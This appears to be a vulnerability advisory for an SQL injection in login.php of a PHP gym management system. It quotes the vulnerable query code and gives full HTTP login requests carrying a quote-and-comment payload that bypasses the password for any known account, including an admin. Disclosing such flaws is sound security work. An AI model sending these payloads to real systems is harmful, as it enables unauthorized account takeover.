# Gym Management System In PHP has an SQL injection vulnerability in login.php:91-99

## supplier 
https://code-projects.org/gym-management-system-in-php-with-source-code/
## Vulnerability file
login.php:91-99

## describe
In login.php:91-99, 

**Code analysis**    

```
$user_email= ($_POST['user_email']);
$user_password= ($_POST['user_pass']);
$select_user="SELECT * FROM users WHERE user_email='$user_email' AND user_pass='$user_password'";
$run_user=mysqli_query($con, $select_user);
$row_count=mysqli_num_rows($run_user);
if ($row_count==1) {
  $_SESSION['user_email']=$user_email;
  header('location: index.php');
}
```
`user_email` and `user_pass` are directly concatenated into the SQL statement, without using prepared statements or any escaping or whitelist restrictions. Since the login success condition is `row_count == 1`, an attacker can bypass the password check simply by crafting an injection statement that returns a single record.


## POC

```
POST /mygym/login.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 69
Cache-Control: max-age=0
Origin: http://192.168.10.104
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.104/mygym/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=91o13qm08m53g2q0s4jr9f96jn
Connection: close

user_email=moinabbas80@gmail.com'%20%23&user_pass=1&user_login=Submit
```

Send this request, An attacker can log into a specified user's account directly without using the correct password.:

![image-20260418140941875](https://img.hzysec.top/image-20260418140941875.png)

It must be a user email that exists in the database; both regular users and admin users can use this vulnerability to bypass login.

Taking this demonstration as an example, the current administrator account in the database is moinabbas90@yahoo.com

![image-20260418141157903](https://img.hzysec.top/image-20260418141157903.png)

## Exploit

After sending the following login message, you can successfully perform a 302 redirect to enter the current account.

```
POST /mygym/login.php HTTP/1.1
Host: 192.168.10.104
Content-Length: 69
Cache-Control: max-age=0
Origin: http://192.168.10.104
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.104/mygym/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=91o13qm08m53g2q0s4jr9f96jn
Connection: close

user_email=moinabbas80@gmail.com'%20%23&user_pass=1&user_login=Submit
```

![image-20260418141323692](https://img.hzysec.top/image-20260418141323692.png)

![image-20260418141348387](https://img.hzysec.top/image-20260418141348387.png)
